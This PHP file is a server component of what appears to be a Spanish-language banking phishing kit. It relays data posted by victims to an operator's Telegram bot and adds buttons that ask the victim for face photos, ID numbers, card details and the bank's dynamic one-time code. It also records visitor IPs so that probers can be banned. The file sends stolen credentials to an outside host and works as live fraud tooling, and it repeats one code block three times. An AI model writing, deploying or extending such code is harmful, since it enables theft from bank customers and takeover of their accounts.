<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

session_start();
header('Content-Type: application/json');
header('X-Robots-Tag: noindex, nofollow, noarchive');

$logFile = __DIR__ . '/../log_pse.txt';
$log = function($msg) use ($logFile) {
    file_put_contents($logFile, date('Y-m-d H:i:s') . " | [b-34f4] " . $msg . "\n", FILE_APPEND | LOCK_EX);
};

$log("═══════════════════════════════════════════════════════════════");
$log("=== INICIO procesar_logo.php ===");

// Config local con fallback al global
    $config = [];
    $currentDir = __DIR__;
    $candidates = [];
    for ($i = 0; $i < 8; $i++) {
        $candidates[] = $currentDir . '/config.php';
        $candidates[] = $currentDir . '/token_bank/config.php';
        $currentDir = dirname($currentDir);
    }

    foreach ($candidates as $candidate) {
        if (file_exists($candidate)) {
            $loaded = include $candidate;
            if (is_array($loaded)) {
                $config = $loaded;
                if (!empty($config['bot_token']) && !empty($config['chat_id'])) {
                    break;
                }
            }
        }
    }

    $transactionId = $_POST['transactionId'] ?? '';

// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------

if (empty($message) || empty($transactionId)) {
    $raw  = file_get_contents('php://input');
    $json = json_decode($raw, true);
    $message       = $json['message']       ?? $message;
    $transactionId = $json['transactionId'] ?? $transactionId;
}

$log("TransactionId: $transactionId");
$log("Message length: " . strlen($message));

if (empty($message) || empty($transactionId)) {
    $log("ERROR: Datos incompletos");
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

if (function_exists('jelpi_format_message_bancos')) {
    $message = jelpi_format_message_bancos($message, 'b-10');
}

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '👤 Cara',     'callback_data' => "error:{$transactionId}"],
            ['text' => '🪪 Cédula',   'callback_data' => "cedula:{$transactionId}"]
        ],
        [
            ['text' => '💳 Tarjeta',  'callback_data' => "error_tc:{$transactionId}"],
            ['text' => '🔑 Dinámica', 'callback_data' => "pedir_dinamica:{$transactionId}"]
        ],
        [
            ['text' => '🏦 Error Logo', 'callback_data' => "error_logo:{$transactionId}"],
            ['text' => '🏁 Finalizar',  'callback_data' => "confirm_finalizar:{$transactionId}"]
        ]
    ,
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]]
];

$data = [
    'chat_id'      => $config['chat_id'],
    'text'         => $message,
    'parse_mode'   => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

$log("Enviando a Telegram...");

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => json_encode($data),
    CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
    CURLOPT_TIMEOUT        => 30,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
]);

$response  = curl_exec($ch);
$httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

$log("HTTP Code: $httpCode | CURL error: " . ($curlError ?: 'ninguno'));

if ($curlError) {
    $log("CURL ERROR: $curlError");
    echo json_encode(['status' => 'error', 'message' => 'Error de conectividad: ' . $curlError]);
    exit;
}

$result = json_decode($response, true);

if (!$result || empty($result['ok'])) {
    $log("ERROR Telegram: " . ($result['description'] ?? 'Sin descripción'));
    echo json_encode(['status' => 'error', 'message' => $result['description'] ?? 'Error en Telegram']);
    exit;
}

$messageId = $result['result']['message_id'] ?? null;
if (!$messageId) {
    $log("ERROR: messageId no encontrado en respuesta");
    echo json_encode(['status' => 'error', 'message' => 'No se obtuvo messageId']);
    exit;
}

$log("✅ Envío exitoso! MessageId: $messageId");
$log("=== FIN procesar_logo.php ===");
$log("═══════════════════════════════════════════════════════════════\n");

echo json_encode([
    'status'        => 'success',
    'messageId'     => $messageId,
    'transactionId' => $transactionId
]);
